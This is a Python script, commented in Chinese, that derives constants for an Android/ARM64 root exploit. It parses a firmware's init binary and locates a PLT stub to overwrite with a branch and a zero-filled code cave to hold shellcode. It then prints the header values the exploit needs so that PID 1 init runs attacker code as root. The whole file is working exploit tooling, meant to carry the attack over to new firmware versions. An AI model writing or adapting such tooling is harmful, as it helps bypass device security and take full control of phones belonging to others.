#!/usr/bin/env python3
# init_hook_derive.py - 从目标固件的 /system/bin/init 推 init-hook 载荷常量
#
# exploit 的 init-hook 路径把 PID 1 的 init 打一个 B 跳到"代码洞"里的 shellcode，
# 从而在 init 的上下文里拿到 root。它需要 5 组常量（原来只对 15.1.14.7 有值）：
#
#   INIT_TEXT_FILE_VA       可执行 LOAD 段（PF_X）的 p_vaddr
#                           —— mm->start_code 就是这个段的运行期基址，于是
#                              运行期 VA = start_code + (file_va - INIT_TEXT_FILE_VA)
#   INIT_HOOK_PATCH_FILE_VA 补丁点：目标二进制里某个 PLT 桩的 vaddr（打 B 指令用）
#   INIT_HOOK_PATCH_EXPECT0..3  该桩的 4 条原始指令（运行期写前逐字校验，不匹配就拒绝）
#   INIT_HOOK_CAVE_FILE_VA  代码洞：可执行段内一段**全 0** 的填充（≥ 61 word = 244 B，
#                           且必须落在同一页内 —— 运行期会检查不跨页）
#   INIT_HOOK_CAVE_EXPECT0  洞里期望的字（0）
#
# 依赖: pip install pyelftools capstone
#
# 用法:
#   python3 init_hook_derive.py <init 二进制> [--symbol __system_property_update]
#
# 自检：补丁点的 GOT 目标必须与 .rela.plt 里该符号的 r_offset 对上；桩的 4 条指令
# 必须是 adrp/ldr/add/br 形态；代码洞必须全 0 且不跨页。任一条不满足就报错退出，
# 不会静默给出一组"看起来对"的值。
import re
import struct
import sys

from elftools.elf.elffile import ELFFile
from capstone import Cs, CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN

CAVE_WORDS = 61                      # = INIT_HOOK_SHELLCODE_WORDS
CAVE_BYTES = CAVE_WORDS * 4
PAGE = 4096


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    path = sys.argv[1]
    want = sys.argv[sys.argv.index('--symbol') + 1] if '--symbol' in sys.argv else None
    f = open(path, 'rb')
    e = ELFFile(f)
    md = Cs(CS_ARCH_ARM64, CS_MODE_LITTLE_ENDIAN)

    # ---- 1. 可执行 LOAD 段 ----
    x_load = None
    for seg in e.iter_segments():
        if seg['p_type'] == 'PT_LOAD' and (seg['p_flags'] & 0x1):
            x_load = seg
            break
    if x_load is None:
        sys.exit('找不到 PF_X 的 PT_LOAD')
    text_va = x_load['p_vaddr']
    text_end_va = x_load['p_vaddr'] + x_load['p_filesz']
    print('可执行 LOAD: vaddr %#x  off %#x  filesz %#x  -> [%#x, %#x)'
          % (text_va, x_load['p_offset'], x_load['p_filesz'], text_va, text_end_va))

    def read_va(va, n):
        seg = next(s for s in e.iter_segments()
                   if s['p_type'] == 'PT_LOAD' and s['p_vaddr'] <= va < s['p_vaddr'] + s['p_filesz'])
        f.seek(seg['p_offset'] + (va - seg['p_vaddr']))
        return f.read(n)

    # ---- 2. .plt / .rela.plt / .dynsym / .dynstr ----
    plt = e.get_section_by_name('.plt')
    rela = e.get_section_by_name('.rela.plt')
    dynsym = e.get_section_by_name('.dynsym')
    if not (plt and rela and dynsym):
        sys.exit('缺 .plt/.rela.plt/.dynsym')
    print('.plt: vaddr %#x size %#x ; .rela.plt: %d 项'
          % (plt['sh_addr'], plt['sh_size'], rela.num_relocations()))

    # GOT 槽 -> 符号名
    got2sym = {}
    for r in rela.iter_relocations():
        s = dynsym.get_symbol(r['r_info_sym'])
        got2sym[r['r_offset']] = s.name
    if want and want not in got2sym.values():
        sys.exit('.rela.plt 里没有符号 %s' % want)

    # ---- 3. 扫 PLT 桩，按 GOT 目标认领符号 ----
    def decode_kind(ins):
        return ins.mnemonic

    found = []
    body = read_va(plt['sh_addr'], plt['sh_size'])
    for off in range(0, len(body) - 16, 4):
        ins = list(md.disasm(body[off:off + 20], plt['sh_addr'] + off))
        if len(ins) < 4:
            continue
        k = [i.mnemonic for i in ins[:5]]
        # 可能带 BTI (bti c = 0xd503245f)：bti c; adrp; ldr; add; br
        base = 1 if (k[0] == 'bti') else 0
        if base + 4 > len(ins):
            continue
        w = ins[base:base + 4]
        if not (w[0].mnemonic == 'adrp' and w[1].mnemonic == 'ldr' and w[2].mnemonic == 'add'
                and w[3].mnemonic == 'br'):
            continue
        if not w[0].op_str.startswith('x16, '):      # adrp x16, #page
            continue
        if not w[1].op_str.startswith('x17, [x16'):  # ldr  x17, [x16, #off]
            continue
        try:
            adrp_page = int(re.match(r'x16, #(0x[0-9a-f]+)', w[0].op_str).group(1), 16)
            ldr_off = int(re.search(r'#(0x[0-9a-f]+|\d+)', w[1].op_str.split(',')[-1]).group(1), 0)
        except Exception:
            continue
        got = adrp_page + ldr_off
        sym = got2sym.get(got)
        if sym is None:
            continue
        words = list(struct.unpack('<%dI' % (4 + base), body[off:off + 4 * (4 + base)]))
        found.append(dict(va=plt['sh_addr'] + off, sym=sym, words=words, bti=bool(base),
                          got=got, stub_len=4 + base))

    # 去重（同一桩可能被 4 字节步进匹配到多次）
    uniq = {}
    for x in found:
        uniq.setdefault((x['va'], x['sym']), x)
    found = sorted(uniq.values(), key=lambda x: x['va'])
    print('识别出 %d 个 PLT 桩（GOT 目标能对上符号）' % len(found))
    cand = [x for x in found if want is None or x['sym'] == want]
    if want:
        if not cand:
            sys.exit('没找到 %s 的 PLT 桩' % want)
        cand = [min(cand, key=lambda x: x['va'])]
    for x in cand[:12]:
        print('  %#x  %-32s bti=%d  GOT=%#x  首字: %s'
              % (x['va'], x['sym'], x['bti'], x['got'],
                 ' '.join('%08x' % w for w in x['words'])))
    if not cand:
        sys.exit('没有可用的补丁点候选')

    # ---- 4. 代码洞 ----
    # 两种情形（都要求：全 0、≥244 B、整段落在同一页内）：
    #   a) "段尾填充"：可执行段 p_filesz 结束处到该页页尾之间。内核把 mapping 向上取整到页
    #      （binfmt_elf 的 elf_map 长度取整），所以这段 VA 在映射内、可执行，且页内剩余
    #      部分读到的就是**文件里那一段字节**。链接器通常在这里留 0 —— 15.1.14.7 用的就是它。
    #   b) 段内任意一段全 0 填充（函数间对齐等）。
    seg_off = x_load['p_offset']
    f.seek(seg_off)
    xbuf = f.read(x_load['p_filesz'])
    runs = []
    for m in re.finditer(rb'\x00+', xbuf):
        ln = m.end() - m.start()
        if ln < CAVE_BYTES:
            continue
        s = m.start() + ((4 - m.start() % 4) % 4)
        while s + CAVE_BYTES <= m.end():
            va = text_va + s
            if (va & 0xfff) + CAVE_BYTES <= PAGE:
                runs.append((va, ln, '段内填充'))
                break
            s += 4
    # (a) 段尾填充：文件里 text_end_va 之后、到本页页尾的字节
    page_tail = (text_end_va + PAGE - 1) & ~(PAGE - 1)
    room = page_tail - text_end_va
    tail_ok = False
    if room >= CAVE_BYTES and (text_end_va & 0xfff) + CAVE_BYTES <= PAGE:
        # 注意：这段字节在文件里的位置 = text_end_va（X 段的 p_offset 与 p_vaddr 同增）
        f.seek(seg_off + x_load['p_filesz'])
        tail = f.read(room)
        if len(tail) == room and set(tail) == {0}:
            runs.insert(0, (text_end_va, room, '段尾填充(映射向上取整的那部分)'))
            tail_ok = True
    print('代码洞候选（需 >=%d B 全 0 且不跨页）: %d 个%s'
          % (CAVE_BYTES, len(runs), '（含段尾填充）' if tail_ok else ''))
    for va, ln, why in runs[:12]:
        print('  %#x  (页内偏移 %#x, 连续 %d 字节, %s)' % (va, va & 0xfff, ln, why))
    if not runs:
        sys.exit('找不到合适的代码洞 —— 需要人肉挑一段只读可执行的全 0 填满区')

    # ---- 5. 自检 + 输出 ----
    patch = cand[0]
    assert patch['va'] + 16 <= text_end_va, '补丁点超出可执行段文件范围'
    cave_va = runs[0][0]        # 段尾填充优先（与 15.1.14.7 的取向一致）
    print()
    print('=' * 72)
    print('# 供 fw_profile.h 使用（相对 _stext 的可执行段内偏移；运行期 + start_code）')
    print('#define INIT_TEXT_FILE_VA             %#xULL' % text_va)
    print('#define INIT_HOOK_PATCH_FILE_VA       %#xULL   // %s 的 PLT 桩%s'
          % (patch['va'], patch['sym'], ' (带 BTI)' if patch['bti'] else ''))
    for i, w in enumerate(patch['words']):
        print('#define INIT_HOOK_PATCH_EXPECT%d       %#010xU' % (i, w))
    print('#define INIT_HOOK_CAVE_FILE_VA        %#xULL   // 可执行段内全 0 填充'
          % cave_va)
    print('#define INIT_HOOK_CAVE_EXPECT0        %#010xU' % 0)
    print('=' * 72)
    print('自检: 补丁点 %#x 在 [%#x,%#x) 内 %s；GOT %#x 命中符号 %s；洞 %#x 页内偏移 %#x'
          % (patch['va'], text_va, text_end_va, patch['va'] + 16 <= text_end_va,
             patch['got'], patch['sym'], cave_va, cave_va & 0xfff))


if __name__ == '__main__':
    main()
